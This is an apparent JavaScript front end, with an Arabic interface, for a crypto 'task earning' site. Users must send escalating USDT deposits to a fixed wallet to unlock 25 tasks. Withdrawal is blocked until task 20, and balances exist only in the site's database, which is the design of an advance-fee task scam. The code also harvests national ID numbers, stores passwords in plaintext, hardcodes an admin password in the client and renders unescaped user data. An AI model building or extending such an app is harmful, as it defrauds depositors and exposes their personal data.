// ==== CDN Supabase ====
const SUPABASE_URL = "https://sogswvvfyrwaibewbhus.supabase.co";
const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNvZ3N3dnZmeXJ3YWliZXdiaHVzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjM5MDMzNjcsImV4cCI6MjA3OTQ3OTM2N30.zgZc0cNRdW62MPWLmk1EymvydH9Kx0svRlvD1uG8VkI";

const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ==== بيانات المستخدمين ====
let currentUser = null;

// ==== عرض الهيدر ====
function showHeader(show) {
  document.getElementById("header").style.display = show ? "flex" : "none";
}

// ==== تسجيل الدخول / إنشاء حساب ====
function loginPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
  <div class="container"><div class="box">
  <h2 style="text-align:center;">تسجيل الدخول</h2>
  <input id="loginEmail" type="email" placeholder="البريد الإلكتروني">
  <input id="loginPass" type="password" placeholder="كلمة المرور">
  <button onclick="login()">تسجيل الدخول</button>
  <button onclick="registerPage()" style="background:#444;color:white;">إنشاء حساب</button>
  </div></div>`;
}

function registerPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
  <div class="container"><div class="box">
  <h2 style="text-align:center;">إنشاء حساب جديد</h2>
  <input id="regName" placeholder="الاسم الكامل">
  <input id="regEmail" type="email" placeholder="البريد الإلكتروني">
  <input id="regNID" placeholder="الرقم الوطني">
  <input id="regPhone" placeholder="رقم الهاتف">
  <select id="regCountry">
    <option value="+963">🇸🇾 سوريا +963</option>
    <option value="+20">🇪🇬 مصر +20</option>
    <option value="+971">🇦🇪 الإمارات +971</option>
    <option value="+90">🇹🇷 تركيا +90</option>
  </select>
  <input id="regPass" type="password" placeholder="كلمة المرور">
  <button onclick="register()">تسجيل</button>
  <button onclick="loginPage()" style="background:#444;color:white;">رجوع</button>
  </div></div>`;
}

// ==== تسجيل مستخدم جديد في Supabase ====
async function register() {
  let name = document.getElementById("regName").value;
  let email = document.getElementById("regEmail").value;
  let nid = document.getElementById("regNID").value;
  let phone = document.getElementById("regPhone").value;
  let country = document.getElementById("regCountry").value;
  let pass = document.getElementById("regPass").value;

  if (!name || !email || !nid || !phone || !pass) { alert("يرجى ملء جميع الحقول"); return; }

  let { data, error } = await supabase
    .from("users")
    .insert([{ name, email, nid, phone, country, pass, balance:0, tasksCompleted:0, taskDeposits:JSON.stringify(Array(25).fill(0)), depositRequests:JSON.stringify([]), withdrawRequests:JSON.stringify([]) }]);

  if (error) { alert("خطأ في التسجيل: " + error.message); return; }
  alert("✅ تم إنشاء الحساب بنجاح");
  loginPage();
}

// ==== تسجيل الدخول من Supabase ====
async function login() {
  let email = document.getElementById("loginEmail").value;
  let pass = document.getElementById("loginPass").value;

  let { data, error } = await supabase
    .from("users")
    .select("*")
    .eq("email", email)
    .eq("pass", pass)
    .single();

  if (error || !data) { alert("بيانات غير صحيحة"); return; }

  currentUser = data;
  homePage();
}

// ==== المهام مع أسعار منطقية ====
const tasksPricing = [];
let dep = 10;
let rew = 20;
for (let i=0;i<25;i++){
  if(i<14){ // المهمات 1-14 صعود منطقي
    tasksPricing.push({deposit:dep,reward:rew});
    dep*=2; rew*=2;
  } else { // المهمات 15-25 أسعار منطقية مختلفة حتى 10000
    let nextDep = Math.floor(Math.random()*(5000-100)+100); // إيداع عشوائي 100-5000
    let nextRew = Math.floor(Math.random()*(10000-nextDep)+nextDep); // ربح حتى 10000
    tasksPricing.push({deposit:nextDep,reward:nextRew});
  }
}

// ==== الصفحة الرئيسية + المهام ====
function homePage() {
  showHeader(true);
  let tasksHtml = "";

  let taskDeposits = JSON.parse(currentUser.taskDeposits);

  for (let i = 0; i < 25; i++) {
    let locked = taskDeposits[i] < tasksPricing[i].deposit || currentUser.tasksCompleted < i;
    let completed = currentUser.tasksCompleted > i;
    tasksHtml += `
      <div class="task ${locked ? 'locked' : ''}">
        <i class="fa-solid fa-rocket"></i>
        <div class="task-content">
          <h3>المهمة رقم ${i + 1}</h3>
          <p>الإيداع المطلوب: <b>${tasksPricing[i].deposit}$</b></p>
          <p>الربح عند الإنجاز: <b>${tasksPricing[i].reward}$</b></p>
          <p>الحالة: <b>${completed ? 'تم الإنجاز' : locked ? 'مقفلة' : 'جاهزة'}</b></p>
          <button onclick="openTask(${i})" ${locked || completed ? 'disabled' : ''}>تنفيذ المهمة</button>
        </div>
      </div>`;
  }

  document.getElementById("app").innerHTML = `
  <div class="container">
    <h2>مرحبا ${currentUser.name} | رصيدك: ${currentUser.balance}$</h2>
    ${tasksHtml}
  </div>`;
}

// ==== فتح المهمة ====
function openTask(index) {
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>المهمة رقم ${index + 1}</h2>
      <p>المطلوب قبل التنفيذ: إيداع ${tasksPricing[index].deposit}$</p>
      <p>ربحك بعد الإنجاز: ${tasksPricing[index].reward}$</p>
      <button onclick="checkDeposit(${index})">تنفيذ المهمة</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

// ==== تنفيذ المهمة ====
async function checkDeposit(index) {
  let taskDeposits = JSON.parse(currentUser.taskDeposits);
  if(taskDeposits[index]<tasksPricing[index].deposit){ alert("❌ لا يمكن تنفيذ المهمة بدون الإيداع المطلوب"); return; }

  currentUser.balance += tasksPricing[index].reward;
  currentUser.tasksCompleted = Math.max(currentUser.tasksCompleted,index+1);
  taskDeposits[index] = tasksPricing[index].deposit; // تأكيد الإيداع
  currentUser.taskDeposits = JSON.stringify(taskDeposits);

  let { error } = await supabase.from("users").update({ balance: currentUser.balance, tasksCompleted: currentUser.tasksCompleted, taskDeposits: currentUser.taskDeposits }).eq("email",currentUser.email);
  if(error){ alert("خطأ: "+error.message); return; }

  alert("✅ تم تنفيذ المهمة وتم إضافة الأرباح!");
  homePage();
}

// ==== الإيداع ====
function depositPage() {
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>إيداع الأموال</h2>
      <p>لإضافة رصيد، يرجى تحويل المبلغ إلى المحفظة التالية:</p>
      <p style="font-weight:bold;">USDT TRC20: <span style="color:#ff416c;">TQi3mspeUBS1Y4NknPu4zZVFiFG2JU5MkX</span></p>
      <input id="depositAmount" type="number" placeholder="المبلغ الذي حولته">
      <input id="depositImage" type="file" accept="image/*">
      <button onclick="submitDeposit()">تقديم طلب الإيداع</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

async function submitDeposit() {
  let amount = parseFloat(document.getElementById("depositAmount").value);
  let image = document.getElementById("depositImage").files[0];
  if(!amount || !image){ alert("يرجى إدخال المبلغ ورفع الصورة"); return; }

  let reader = new FileReader();
  reader.onload = async function(){
    let depositReq = { amount, image: reader.result, date: new Date().toLocaleString() };
    let depositRequests = JSON.parse(currentUser.depositRequests || "[]");
    depositRequests.push(depositReq);
    currentUser.depositRequests = JSON.stringify(depositRequests);

    let { error } = await supabase.from("users").update({ depositRequests: currentUser.depositRequests }).eq("email",currentUser.email);
    if(error){ alert("خطأ: "+error.message); return; }

    alert("✅ تم إرسال طلب الإيداع");
    homePage();
  }
  reader.readAsDataURL(image);
}

// ==== السحب ====
function withdrawPage() {
  if(currentUser.tasksCompleted<20){ alert("❌ لا يمكن السحب قبل المهمة 20"); return; }
  document.getElementById("app").innerHTML = `
  <div class="container">
    <div class="box">
      <h2>سحب الأموال</h2>
      <p>رصيدك: ${currentUser.balance}$</p>
      <input id="withdrawWallet" placeholder="أدخل محفظتك">
      <button onclick="submitWithdraw()">طلب سحب</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div>
  </div>`;
}

async function submitWithdraw() {
  let wallet = document.getElementById("withdrawWallet").value;
  if(!wallet){ alert("يرجى إدخال المحفظة"); return; }

  let withdrawRequests = JSON.parse(currentUser.withdrawRequests || "[]");
  withdrawRequests.push({ wallet, amount: currentUser.balance, date: new Date().toLocaleString() });
  currentUser.withdrawRequests = JSON.stringify(withdrawRequests);
  currentUser.balance = 0;

  let { error } = await supabase.from("users").update({ withdrawRequests: currentUser.withdrawRequests, balance: currentUser.balance }).eq("email",currentUser.email);
  if(error){ alert("خطأ: "+error.message); return; }

  alert("✅ تم إرسال طلب السحب");
  homePage();
}

// ==== لوحة الإدارة ====
const adminPassword = "aalmwt10";
async function adminLogin() {
  let pwd = prompt("ادخل كلمة مرور الادمن:");
  if(pwd !== adminPassword){ alert("كلمة مرور خاطئة"); return; }

  showHeader(false);

  let { data: allUsersData, error } = await supabase.from("users").select("*");
  if(error){ alert("خطأ: "+error.message); return; }

  let requestsHtml = "";
  allUsersData.forEach(u=>{
    let depReqs = JSON.parse(u.depositRequests || "[]");
    depReqs.forEach((r,i)=>{
      requestsHtml += `
      <div class="admin-request">
        <p><b>المستخدم:</b> ${u.name} | ${u.email} | ${u.phone}</p>
        <p><b>المبلغ:</b> ${r.amount}$ | التاريخ: ${r.date}</p>
        <img src="${r.image}" alt="صورة الإيداع" style="max-width:200px;display:block;">
        <div style="display:flex;gap:10px;">
          <button onclick="approveDeposit('${u.email}',${i})">✅ قبول</button>
          <button class="reject" onclick="rejectDeposit('${u.email}',${i})">❌ رفض</button>
        </div>
      </div>`;
    });
  });

  document.getElementById("app").innerHTML = `<div class="container"><div class="admin-box"><h2>طلبات الإيداع</h2>${requestsHtml}<button class="back-btn" onclick="homePage()">رجوع</button></div></div>`;
}

async function approveDeposit(email,index){
  let { data, error } = await supabase.from("users").select("*").eq("email",email).single();
  if(error || !data) return;

  let depReqs = JSON.parse(data.depositRequests || "[]");
  let nextTask = data.tasksCompleted;
  let taskDeposits = JSON.parse(data.taskDeposits || "[]");
  taskDeposits[nextTask] += depReqs[index].amount;
  depReqs.splice(index,1);

  await supabase.from("users").update({ depositRequests: JSON.stringify(depReqs), taskDeposits: JSON.stringify(taskDeposits) }).eq("email",email);

  if(currentUser.email===email){ currentUser.depositRequests=JSON.stringify(depReqs); currentUser.taskDeposits=JSON.stringify(taskDeposits); }

  adminLogin();
}

async function rejectDeposit(email,index){
  let { data, error } = await supabase.from("users").select("*").eq("email",email).single();
  if(error || !data) return;

  let depReqs = JSON.parse(data.depositRequests || "[]");
  depReqs.splice(index,1);

  await supabase.from("users").update({ depositRequests: JSON.stringify(depReqs) }).eq("email",email);

  if(currentUser.email===email){ currentUser.depositRequests=JSON.stringify(depReqs); }

  adminLogin();
}

// ==== بدء التطبيق ====
loginPage();
